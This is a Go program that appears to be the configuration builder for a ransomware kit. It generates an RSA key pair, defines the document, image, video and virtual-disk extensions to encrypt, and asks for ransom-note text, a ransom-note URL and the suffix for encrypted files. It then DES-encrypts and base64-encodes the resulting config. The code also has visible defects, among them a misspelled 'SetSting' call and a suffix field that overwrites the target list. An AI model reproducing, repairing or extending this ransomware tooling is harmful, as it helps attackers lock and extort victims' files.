package main

import (
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"os"
	"strconv"
	"strings"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"reflect"
	"crypto/des"
	"encoding/base64"
	"io/ioutil"
)

func main() {
	// Check Args
	if len(os.Args) != 2 {
		fmt.Println("Usage: ", os.Args[0], "<DES key(8 bytes)>")
		return
	}
	if len(os.Args[1]) != 8 {
		fmt.Println("[Error] Wrong DES key.")
		return
	}

	// Set configs
	N, E := GenRsaKey(1024)
	conf := Config{EncSuffix: ".vmdk|.txt|.zip|.rar|.7z|.doc|.docx|.ppt|.pptx|.xls|.xlsx|.jpg|.gif|.jpeg|.png|.mpg|.mov|.mp4|.avi|.mp3|.pdf|.psd", PubKeyN: N, PubKeyE: E}
	questionDict := map[string]string{
		"KeyFilename":  "Filename to store key file",
		"DkeyFilename": "Filename to store key file for decrypt",
		"ReadmeUrl":    "URL of ONLINE readme file(keep blank to disable)", "ReadmeNetFilename": "Filename of ONLINE readme file(if enabled)",
		"Readme":       "Content of OFFLINE readme file(ONE line)", "ReadmeFilename": "Filename of OFFLINE readme file",
		"EncSuffix":    "Suffix to be added to the end of encrypted files(Include dot)"}
	for key, q := range questionDict {
		var input string
		fmt.Println("Enter your", q)
		fmt.Scan(&input)
		reflect.ValueOf(&conf).Elem().FieldByName(key).SetSting(input)
	}
	fmt.Println("Do you want to skip hidden file? (For windows only) (Y/N)")
Loop:
	for {
		var input string
		fmt.Scan(&input)
		switch input {
		case "Y", "y":
			conf.SkipHidden = true
			break Loop
		case "N", "n":
			conf.SkipHidden = false
			break Loop
		}
	}

	// Encrypt JSON data
	data := conf.export()
	cip, _ := des.NewCipher([]byte(os.Args[1]))
	for offset := 0; len(data)-offset > 8; offset += 8 {
		cip.Encrypt(data[offset:offset+8], data[offset:offset+8])
	}

	// Write Encrypted data to file
	bE := base64.StdEncoding
	target := bE.EncodeToString(data)
	print(target)
}

// Key Pair Gen Funcs
func GenRsaKey(bits int) (N string, E int) {
	privateKey, err := rsa.GenerateKey(rand.Reader, bits)
	check(err)
	derStream := x509.MarshalPKCS1PrivateKey(privateKey)
	block := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: derStream,
	}
	file, err := os.Create("private.pem")
	check(err)
	err = pem.Encode(file, block)
	check(err)
	publicKey := &privateKey.PublicKey
	pubBytes := make([]string, len(publicKey.N.Bytes()))
	for c, i := range publicKey.N.Bytes() {
		pubBytes[c] = strconv.Itoa(int(i))
	}
	pubString := strings.Join(pubBytes, "/")
	return pubString, publicKey.E
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}

// Config struct Funcs
type Config struct {
	PubKeyN string
	PubKeyE int

	Filesuffix   string
	KeyFilename  string
	DkeyFilename string

	Readme         string
	ReadmeFilename string

	ReadmeUrl         string
	ReadmeNetFilename string

	EncSuffix  string
	SkipHidden bool
}

func (self *Config) init(data []byte) {
	err := json.Unmarshal(data, self)
	if err != nil {
		fmt.Println("[Error] Cannot load JSON data.")
		os.Exit(213)
	}
}

func (self *Config) nE(test string) bool {
	if strings.TrimSpace(reflect.ValueOf(self).Elem().FieldByName(test).String()) != "" {
		return true
	}
	return false
}

func (self *Config) check() {
	notEmptyList := []string{"PubKeyN", "PubKeyE", "Filesuffix", "KeyFilename", "DkeyFilename", "Readme", "ReadmeFilename", "EncSuffix", "SkipHidden"}
	for _, k := range notEmptyList {
		if !self.nE(k) {
			fmt.Println("[Error] Config field", k, "can not be empty.")
			os.Exit(213)
		}
	}
}

func (self *Config) export() []byte {
	data, err := json.Marshal(self)
	check(err)
	return data
}
